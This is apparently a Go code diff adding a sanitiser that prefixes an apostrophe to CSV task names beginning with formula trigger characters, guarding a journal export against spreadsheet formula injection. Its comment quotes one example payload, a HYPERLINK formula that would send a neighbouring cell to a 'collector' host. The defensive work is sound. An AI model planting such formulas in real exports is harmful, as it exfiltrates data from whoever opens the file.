@@ -139,6 +139,10 @@ var journalColumns = []string{
 // stamps are what an audit needs and the duration is what a person sorts
 // by, and asking a spreadsheet to subtract two timestamps is asking for the
 // column to be wrong.
+//
+// One cell is mutated on the way out, and it is stated here because a
+// reader who finds a stray apostrophe in a task name deserves to know where
+// it came from: see inertCell, applied to the task column alone.
 func writeJournalCSV(w io.Writer, entries []engine.JournalEntry, truncated bool) error {
 	out := csv.NewWriter(w)
 	if err := out.Write(journalColumns); err != nil {
@@ -157,7 +161,7 @@ func writeJournalCSV(w io.Writer, entries []engine.JournalEntry, truncated bool)
 			strconv.Itoa(e.Attempt),
 			strconv.Itoa(e.Sequence),
 			e.NodeID,
-			e.TaskName,
+			inertCell(e.TaskName),
 			e.FQCN,
 			strconv.FormatBool(e.FQCNUnresolved),
 			string(e.Outcome),
@@ -245,6 +249,44 @@ func finished(ctx context.Context, jobs jobReader, jobID string) bool {
 		return false
 	}
 	return terminalStates[job.State]
+}
+
+// inertCell stops a task name being evaluated as a spreadsheet formula.
+//
+// A runbook author writes a task's name as free text -- internal/engine's
+// journal calls it the residual text channel and nothing validates it --
+// and a name beginning with =, +, - or @ is a FORMULA to Excel, Sheets and
+// LibreOffice, not a label. So `=HYPERLINK("http://collector/?d="&A1,"ok")`
+// in a task name becomes a one-click exfiltration of the row beside it, in
+// a file whose own doc comment above advertises it as safe to forward. The
+// author is privileged over devices; they are not privileged over the
+// workstation of whoever opens the export, and on a multi-user RBAC
+// platform those are routinely different people.
+//
+// The mutation is a leading apostrophe, chosen rather than defaulted to.
+// Excel and Sheets consume it and show the original text; LibreOffice, a
+// ticket paste, pandas and encoding/csv all show it literally, which is a
+// visible blemish on a rare cell and is the price of the cell not running.
+// A leading space would neutralise it just as well and is worse: it is
+// invisible, so a reader cannot tell the export changed anything, and a
+// tool that trims whitespace on import hands the formula straight back.
+//
+// Applied to the task column alone. Every other string cell is constructed
+// or catalog-resolved -- FQCN and InverseFQCN come from collection.Lookup,
+// NodeID is synthesised as "tasks[N]", DeviceID is a stored inventory id,
+// and both key lists are filtered by admitKeys down to names a manifest
+// declared -- so none of them can begin with a trigger character. Guarding
+// them anyway would say those fields are author text, which would be the
+// second false thing this file said about what it carries.
+func inertCell(s string) string {
+	if s == "" {
+		return s
+	}
+	switch s[0] {
+	case '=', '+', '-', '@', '\t', '\r':
+		return "'" + s
+	}
+	return s
 }
 
 // joinKeys renders a key list for one CSV cell. Space separated rather than
